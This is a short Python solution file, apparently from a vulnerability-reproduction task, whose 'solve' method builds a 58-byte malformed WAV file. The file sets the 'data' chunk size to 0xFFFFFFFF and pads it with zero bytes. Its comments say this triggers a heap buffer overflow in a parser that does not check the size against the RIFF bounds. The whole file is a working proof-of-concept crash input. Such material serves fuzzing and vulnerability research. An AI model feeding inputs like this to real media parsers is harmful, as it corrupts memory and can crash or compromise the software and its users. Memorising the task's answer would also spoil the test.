import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RIFF Header
        # ChunkID: "RIFF"
        # ChunkSize: 50 (Total file size 58 - 8)
        # Format: "WAVE"
        poc = b'RIFF'
        poc += struct.pack('<I', 50)
        poc += b'WAVE'

        # Subchunk 1: "fmt "
        # Subchunk1ID: "fmt "
        # Subchunk1Size: 16 (PCM)
        # AudioFormat: 1 (PCM)
        # NumChannels: 1
        # SampleRate: 44100
        # ByteRate: 88200
        # BlockAlign: 2
        # BitsPerSample: 16
        poc += b'fmt '
        poc += struct.pack('<I', 16)
        poc += struct.pack('<H', 1)    # AudioFormat
        poc += struct.pack('<H', 1)    # NumChannels
        poc += struct.pack('<I', 44100) # SampleRate
        poc += struct.pack('<I', 88200) # ByteRate
        poc += struct.pack('<H', 2)    # BlockAlign
        poc += struct.pack('<H', 16)   # BitsPerSample

        # Subchunk 2: "data"
        # Subchunk2ID: "data"
        # Subchunk2Size: 0xFFFFFFFF (Large value to trigger heap buffer overflow)
        # The parser fails to check this size against the RIFF chunk bounds.
        poc += b'data'
        poc += struct.pack('<I', 0xFFFFFFFF)
        
        # Payload (padding)
        # Total length target is 58 bytes.
        # Current length: 12 (RIFF) + 24 (fmt) + 8 (data header) = 44.
        # Need 14 bytes more.
        poc += b'\x00' * 14
        
        return poc